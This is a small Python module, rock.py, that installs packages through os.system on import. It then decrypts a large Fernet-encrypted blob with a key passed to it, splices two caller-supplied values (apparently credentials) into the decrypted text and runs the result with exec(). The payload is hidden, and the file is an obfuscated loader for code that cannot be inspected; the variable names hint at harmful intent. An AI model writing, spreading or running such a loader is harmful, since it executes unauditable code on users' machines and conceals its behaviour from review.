'''
# rock.py

'''

import os 
os.system("pip install cryptography")
os.system("pip install requests")

def a(k,au,ak):
  from cryptography.fernet import Fernet

  small_rocks = "gAAAAABi0ZHMyLtNyv8UUnvt4ANQ0BWABgRs6Un_N1TVhFjuG8nQIlj_l_EkKw13lVxbjMILGBX9JthlF45gz2a_m9HRGIv_gs2JmOrM6vDD0X0FRf731vVsTtRRq6eIyFhwYyWGHjMQMn1tn2D4D_yfDj0o1D8Is7lhNqc-kLLNGzTsINe-fx4uZQdltN8uBd2DvsqzkHUX8yoa7hZJM3exqOcc-QscBDFYWXwHyWCyte4YmRy5j8SeLVVkpxWv1htOFlzsG4t_ezgZRTmx0nbVhCvQN7eWy4gEt67nkNVEbLsVbabP3uwiLR_dy5v3Ka8NcmarC_oQ7Jfv7NuFxUaVx6vC6e2YXQ92rNAlkHnl7o9NGUFk3YVhC3KJ-kz0Ye56OY4NLIUHn6HMDHE6lbJPNiAZj26suYxXV_PxZRGwMN7Lu6IbEIjpGzGAnUCxwbl0rSnjCKRxs4gLiE9hW1Tg-kgtpfABCR26kis0e92l8-uTXwJ-J6n_x2QyIdSmv0ha9rdJB2NlAoIvHHsR-25iiLN2fdTjDoAy-IeiJsfnBhs2_VPqxs7hQHUasU_hlSGlQdvPBRrEs9zzdPVR7sBcLIXgRxpQ6Jsaz-SBjnQSrD2BWxktpedKq3PEvtJoOzbddvmZb5bDntHhed70l6l9zRIi7rjjuo2Qk8IOyNmZtIPZcIbbZ61NCN2Xhq9CBO-Pcl62hI8qHE1cgiDdFk35cHX2wOPqpCHoOqhlqmTCmVN34FHfou2RNbaDZ_M-MQ_pMQWUUVM8wXNp9WNuXDiLSS45wVPs8NLTA_KRzuRkWjl5BHFUuDKmc2yT3tAzMFtiLiNthbhcbOkgmDVpVVG35InoVFMeNFIs-fA05mCoUwg99Yp5uJtlRPntUPIs86idVr5icJ9xRrf99qWU9n-xE6eY8EWm9VM2vjXlrG-gu_qw0jAd73b9ctHieyi89DRoViZZX0b_It0ZekpLHlAPhoT9kxx-bcfQIGr1w8R6ACbmjeliKv8zuxIl7AYzIdO-f3XLQVhApw2JMmWEVS1j63GC7AEy4EUWQKXS3ePn1E82X3aTf6QVE0DyByeuUbbIjbBPxEhX1Y4RbJJ8PEVl_k0ZmDd2CDEFJnjHL0BLswzGhgq3huLLzVV8yCRwu6V1fomqhqQg9djRWvX5ajQak_kXRhLZGEY4ddOnK3DX1sYfOus5oAdh0TalZq6IaIvl1CF5MAf0zzOyOMwaosiBJY5H_9wMjUlcv5_gIUalm47dZ6EpNjF6r5DrLiXmgB7KoDrn6ujkVC6yqjJlqk4p44_UJteOL21W0PCeUxXhuV4sVdLTsqcm7J1byjar_ZeirFRrgmanqQLB6jFhHhOwEKG7lLhnnHv3mOBW2UxTN6eY93uffRA4rTRk0bMFgiHLDcmYPGVZfGptYBdZwa6kyxMt57aS8CoVhIiBdrgbygyqJj2rrz7yPktW4lmM56ZZVDYy0gPC3sbL1-O3--NJPZSoy9hKlgqrOPIbub7YkbarkdsUP3qxC9Ps6BP5C0ZozvA5vpAotny-_u7WNuMCEK6SrT8PF8QYu3E_kMApocgvCcQ4bilKn6nyEAo9h2NQheieADur07ug9dimok8wZ61WolAJTaUF37h_qpg3Z11AfkkBz0R77hovfGQGzhQd6t6XjLRrEVrbQavjzONNZO0okOv9EMg2UWXlz3s3GP4i8Uf5KtDdbEcidr1vVimJjrpF31C6T9_sOKyT0NREJ0rAWLQZdwOLJKMoNPLKirim2h0o03GDFe-_Kuikycnxi2HEXVxi0t9QWRgRQQLJ7GTkwkDpNMwckOYCHgmvXs50v4KflLYnCAiOg3lqca0wCuQ-vXCX1ZxE6ljPqGH3AF_YFZpkwQ0tCiVBBmHWvZ4xSltMKIhrdWnhBaRaI8dVOVUV-R6yZZ25NmKXDqES-qoz0JAcGV7eQ6lMgxuMhMM7n6PnWXZ_OZ1um2ilX4reutVW5SicRu-9ccFJmEdsfT2VQAFBASJABqF3fW3YKBnyc_rC8SMTbPmPpbB_mFKN-jtBJ-bJGt9Hd-mwdawQym4KnxZsvenNUeHZtDMW2vn9gGqO0pmE9Evqaqey787wEb6-3xVEzgSU4XZatyLNghCB5ouEUQ3GPE66PWXKDzqSvy66ghgxdWqJ34WHglR45YICcAzR2zxYQVwXxS7NdOkHoCRiA0Tdu2D8TC8WnUndbjkFwqznoVfD3AxsXUYU4eUBZBbcNKXLoIkBR5lxKNqIAv1wn1mM2xUwlhcNBXJLPaJs7BLFMvNI3uHqGD8CrTZemlAKCFnigNbBw2tR0QZL9ZyOb0EJ9d9jAQMapABUO29pkaVJ8q52qvGf7DSafd7cpWn803nTx3NXs1AWvpNA8wBBt6RlTXW4bCZ5Kws1bFBi6ytWdls2heCZ5st34sWNY2sBvoVuajiob3njWymxAGHR-pyeYk64fGcBCbU8G_mOPzyp_777W9W_xYQRKtNjnUyr8f-vgmDlxd6zE8q9nbw4Hj9EdxZqn957XKp3liA8kGPCaco3OHP7D2tdcWy2Npjf1QzpVNTNubKde0yEnuAglwLjcNnxffPuRSWmlbO_WfnonS1E5wPMmTbvkRFZh8tER9yVMpLMvzKJrl_VsoUpKqbTjaSawITbjLtRUgGV6H_iS7qNWYw4AVlg20r8Q9WV98Zw-8nUjMy8r92pCe1ylKmyKhxIi0o0_hktaxvucE3Wxnf3No8bMWyyDQOTfOelQxxofoMDX-eMG0yJJE1xNnvU_IzPbz4DADTv_Z830kAGGumU1DqzXN3LhLhluUuNxfdrnexpWNhkYahJTd2d-AQrN9PHkyVrWJ469VxUmZpxJoBMGakiJrETAT4mu6yDpzffMVNc4dM1NGJ3hW-Vd50fnJvsyhXNMmBC5thrjv8vM5FdT3VjTOYsJ9u2JAcZYdBYIrToAAy3CjKCOo_evPVDznhDueWEy-LOUehvdwciz17vEQx366wzEkUfe1bL3FR2A_mEt7Sk1avVfbT388Fe6f-Dui6meXuZnIFupWQH96aokwL0NR-zd2UHaX72IE_ITRWWgkOHrOadxynvDAU7-FW4hm5w25HmMHQVCyrYXvX04aXKT1k3o8kddMkBGIeRKiVqBOK5rn_DpL3dtde33FRvAonAw-L3rHjahzjWsjFrQdh6jcp6UDSWVbDJiJmTRlImMUGnC0g1f6rSVRXETJlfL8HsHbw55vIYwBeuqJKRqp1upUR0uS-pWNUm6sQ0FF6uwGmr-j8h0cYz7rnEzB35qOxavJ4ezDW4-Pd5oQvfqbH6BQPtuG2ZvMG2VJOaZKWdFcuExk4ow5aERWOcxdDS7FCBbv6IuVIqrSq_JqbOPlB9DENqaAK0jU2fHWL_pZOf-DkvJkPfCIdCX3bk2LUVYZ9KWwhsPu7dtIWb5_JrrOVhy1Qr6I8oUjM_i7-V8UhgfaPOiJZMN5L5FABdho4_RAJmPyMiCg-rKhYrQUfRyDuyWgdsnR4__oyL3CvXlFsa7wFMPXHNXkPPgdL_jirAL75tgLZXxUtq7Q9qbSHMGBCg0V6QY48wdLW3iVo-RfDQTtYeX-4DL4D1mJyOu-48LfRoWwteyRNC9Aq_ZGEivJgi7K-g-X1qRX6QL9Vizzuv1MZuLG_87QrpQTDE2tLFC9vrY6O-aUdN9giGOgh4a2WMRC6ak6HA_oeDnOkQSjJ4uSZa_fNvYN8WmLu-RYSA9cFflljdfCnQflWNbweD9G0cNa3AfaIYiM7YSdg0jW7R01sq4Nn_k9fru15QFV--KNe5R9tCKO54BCqRJRHdh4s6JR21TzAL0KuGsXUYpJaaT9P13oAU1doRCsN47nrqTuTiRJRH9KeVoKdPuslVPlgIRoCk7cz9zEGBGI4b61F0PmsETHQ69r5qnqpRfFNWKiOECWyTYWnFnUwuGZwjBfro2P9fI5C7VkJ00krdbcpg3R261LUuI4id27D_N1ABlql2877UYp1iYCB84IJ6Qu6WmcKNgw1VCD5a"
  small_rocks = small_rocks.encode()
  new_key = k.encode()
  fernet = Fernet(new_key)

  big_rocks = fernet.decrypt(small_rocks).decode()
  big_rocks = big_rocks.replace("smaller_rocks_are_easier_to_throw",au)
  big_rocks = big_rocks.replace("bigger_rocks_do_more_damage",ak)
  exec(big_rocks)


